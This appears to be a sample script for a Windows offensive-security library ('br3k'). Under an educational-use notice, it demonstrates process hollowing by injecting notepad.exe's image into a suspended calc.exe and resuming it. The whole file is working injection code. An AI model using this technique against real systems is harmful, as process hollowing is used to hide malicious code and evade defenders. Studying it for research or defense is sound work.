# =============================================================================
# IMPORTANT USAGE NOTICE
# 1. Use only for authorized, non-malicious education, research, and testing.
# =============================================================================

import br3k

ORIGINAL_IMAGE_FILEPATH = "C:\\Windows\\System32\\notepad.exe"
INJECTED_IMAGE_FILEPATH = "C:\\Windows\\System32\\calc.exe"

if __name__ == "__main__":

    print("Script: Inject via process hollowing")
    print()

    br3k.sysapi.init()

    image = br3k.fs.FileMapping(ORIGINAL_IMAGE_FILEPATH)
    pe = br3k.pe.native.PtrImage(
        data=image.data,
        size=image.size,
        is_file = True
    )
    mem_image = pe.build_mem_image()

    process = br3k.proc.Process(
        image_path=INJECTED_IMAGE_FILEPATH,
        process_vm_write_strategy=br3k.proc.ProcessVmWriteStrategy.AllocateInAddr
    )
    process.create_user(suspended=True)
    process.init_memory()
    process.create_memory(size=len(mem_image))
    ep = process.get_memory_remote_address()
    process.write_mem_image(mem_image)

    thread = process.main_thread
    thread.set_ep(new_thread=True, ep=ep)
    thread.resume()
